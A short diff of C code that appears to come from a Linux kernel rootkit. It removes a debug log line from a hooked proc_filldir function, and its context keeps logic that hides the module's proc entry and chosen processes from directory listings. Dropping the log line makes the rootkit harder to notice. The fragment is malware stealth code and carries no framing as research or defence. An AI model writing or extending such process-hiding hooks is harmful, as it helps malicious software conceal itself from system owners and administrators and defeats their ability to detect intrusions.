@@ -20,7 +20,6 @@ int hooked_proc_filldir(struct dir_context *ctx, const char *name, int nlen, lof
                         u64 ino, unsigned x) {
 
     /* hide processes and ioctl file */
-    printk("proc triggered\n");
     if (!strcmp(name, PROC_ENTRY_NAME) || check_hidden_process(name)) {
 
         /* hide this */
